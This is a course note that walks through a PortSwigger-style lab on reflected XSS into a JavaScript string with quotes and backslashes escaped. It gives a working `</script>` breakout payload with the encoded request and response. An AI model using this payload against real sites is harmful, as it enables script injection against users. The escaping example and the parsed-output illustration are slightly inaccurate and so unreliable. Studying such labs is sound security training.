---
course: Web Security
topic: Cross-Site Scripting (XSS)
tags: [web-security]
---

## Understanding the Lab Scenario

In this lab, we will focus on a specific type of reflected XSS vulnerability where the single quote (`'`) and backslash (`\`) characters are being escaped. This scenario requires us to carefully craft our payload to bypass these escaping mechanisms.

### Initial Setup

Let's start by examining the initial setup of the lab. Suppose we have a web application with a search feature that reflects user input in the response. The application escapes single quotes and backslashes, making it challenging to inject a script directly.

#### Example HTTP Request

```http
GET /search?q=<payload> HTTP/1.1
Host: vulnerable-app.com
```

#### Example HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <script>
        var query = '<payload>';
    </script>
</body>
</html>
```

### Escaping Mechanisms

The application escapes single quotes and backslashes to prevent injection. For example, if we input `\'`, the application will render it as `\\'`.

#### Vulnerable Code Snippet

```javascript
var query = '<%= request.getParameter("q") %>';
```

This code snippet shows how the user input is directly inserted into the JavaScript variable without proper sanitization.

### Breaking Out of the Script Tag

To exploit this vulnerability, we need to break out of the script tag and inject our own malicious script. Let's walk through the steps to achieve this.

#### Step 1: Remove Single Quotes and Backslashes

First, we need to ensure that our payload does not contain any single quotes or backslashes that would be escaped. We can use other characters to achieve the same effect.

#### Step 2: Craft the Payload

We can use the `</script>` tag to break out of the current script block and inject our own script. Here’s how we can construct the payload:

```plaintext
</script><script>alert(1)</script>
```

This payload will close the existing script tag and open a new one, allowing us to execute the `alert(1)` function.

#### Full HTTP Request and Response

```http
GET /search?q=%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: vulnerable-app.com
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
</head>
<body>
    <script>
        var query = '</script><script>alert(1)</script>';
    </script>
</body>
</html>
```

### Execution and Confirmation

When the above request is sent, the browser will interpret the response as follows:

```html
<script>
    var query = '</script><script>alert(1)</script>';
</script>
<script>alert(1)</script>
```

This will trigger the `alert(1)` function, confirming that the XSS vulnerability has been exploited.

---
<!-- nav -->
[[04-Real-World Examples and Recent Breaches|Real-World Examples and Recent Breaches]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/22-Lab 21 Reflected XSS into a JavaScript string with single quote and backslash escaped/00-Overview|Overview]] | [[Web Security (PortSwigger)/03-Cross-Site Scripting (XSS)/22-Lab 21 Reflected XSS into a JavaScript string with single quote and backslash escaped/06-Understanding the Vulnerability|Understanding the Vulnerability]]
